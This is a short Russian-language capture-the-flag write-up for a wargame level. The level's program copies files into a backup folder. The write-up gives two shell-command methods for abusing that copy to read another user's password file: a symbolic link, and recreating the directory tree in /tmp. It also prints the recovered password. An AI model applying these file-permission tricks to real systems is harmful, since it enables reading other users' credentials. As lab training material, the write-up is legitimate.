## Level08

Данная программа считывает файл, переданный в качестве аргумента командной строки, и копирует его в `./backup/<filename>`. Cкопированный файл создается с разрешениями `660` для пользователя `level09` и группы `users`. Так как все пользователи принадлежат к группе `users`, мы сможем прочитать любой скопированный файл.

### Подход 1

Создадим символическую ссылку:

```bash
> chmod 770 .
> ln -s ../level09/.pass pass
> chmod 777 pass
> ./level08 pass
> cat backups/pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
> rm pass && chmod 550 . #чистим
```

### Подход 2

Повторим иерархию директорий в `/tmp`:

```bash
> cd /tmp
> mkdir -p backups/home/users/level09
> ~/level08 /home/users/level09/.pass
> cat backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```



